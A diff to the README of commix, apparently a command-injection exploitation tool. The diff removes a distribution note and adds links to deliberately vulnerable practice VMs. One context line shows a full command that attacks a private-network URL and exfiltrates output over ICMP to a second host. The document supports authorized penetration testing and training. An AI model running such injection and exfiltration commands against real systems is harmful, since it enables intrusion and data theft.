@@ -23,11 +23,6 @@ The tool is only for testing and academic purposes and can only be used where st
 [Python](http://www.python.org/download/) version **2.6.x** or **2.7.x** is required for running this program.
 
 #Installation
-
-Commix comes pre-installed on the following Linux distributions:
-
-- [BlackArch](http://blackarch.org/)
-
 Download commix by cloning the Git repository:
 
     git clone https://github.com/stasinopoulos/commix.git commix
@@ -111,3 +106,14 @@ Download commix by cloning the Git repository:
 
     su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
 
+
+####Command injection testbeds.
+A collection of pwnable VMs, that includes web apps vulnerable to command injections.
+- [Damn Vulnerable Web App] (http://www.dvwa.co.uk/)
+- [OWASP: Mutillidae] (https://www.owasp.org/index.php/Category:OWASP_Mutillidae)
+- [bWAPP: bee-box (v1.6)] (http://www.itsecgames.com/)
+- [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/)
+- [Pentester Lab: Web For Pentester] (https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/)
+- [Pentester Academy: Command Injection ISO: 1] (https://www.vulnhub.com/entry/command-injection-iso-1,81/)
+- [SpiderLabs: MCIR (ShelLOL)](https://github.com/SpiderLabs/MCIR/tree/master/shellol)
+- [...]
